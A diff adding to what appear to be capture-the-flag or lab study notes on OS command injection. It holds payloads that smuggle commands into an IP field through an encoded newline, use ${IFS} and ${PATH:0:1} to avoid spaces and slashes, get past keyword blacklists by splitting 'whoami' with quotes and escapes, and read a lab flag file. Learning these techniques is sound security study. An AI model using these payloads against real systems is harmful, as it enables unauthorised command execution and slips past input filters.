@@ -61,3 +61,27 @@ ip=127.0.0.1%0a{ls,-la}
 
 127.0.0.1%0a{ls,-la,${IFS},${PATH:0:1}home}
 ```
+
+# Bypassing Blacklisted Command
+```bash
+# Whoami will not work naturally but doing single or double
+w'h'o'am'i 
+# putting all things together
+127.0.0.1%0aw'h'o'am'i
+```
+
+```bash
+who$@ami
+w\ho\am\i
+```
+
+```powershell
+who^ami
+```
+
+### Exercise
+```bash
+# This will print the directory
+127.0.0.1%0a{l's',${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}}
+127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
+```
